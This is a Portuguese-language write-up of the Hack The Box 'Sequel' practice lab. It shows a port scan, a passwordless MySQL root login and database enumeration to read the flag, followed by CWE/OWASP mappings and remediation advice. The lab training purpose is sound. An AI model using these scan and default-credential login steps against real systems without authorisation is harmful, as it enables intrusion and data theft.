# HTB Starting Point — Sequel

| Campo | Detalhe |
|---|---|
| SO | Linux |
| Dificuldade | Muito Fácil |
| Categoria | Credenciais padrão/fracas em banco de dados |
| Ferramentas | RustScan, Nmap, cliente MySQL |

## Recon

```
rustscan -a <TARGET_IP> -- -sV -sC
```

Resultado: porta 3306/tcp aberta, serviço MySQL.

## Exploração

Tentativa de conexão com usuário `root` sem senha (credencial padrão não removida):

```
mysql -h <TARGET_IP> -u root
```

Acesso concedido. Enumeração de bancos e tabelas disponíveis:

```sql
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <tabela_com_flag>;
```

## Mapeamento OWASP/CWE

- **CWE-521** (Weak Password Requirements) / **CWE-1392** (Use of Default Credentials)
- **A07:2021 – Identification and Authentication Failures** (OWASP Top 10)

## Remediação

- Definir senha forte para todas as contas, especialmente `root`
- Restringir acesso remoto ao MySQL apenas a hosts/aplicações autorizadas
- Remover ou desabilitar contas padrão não utilizadas
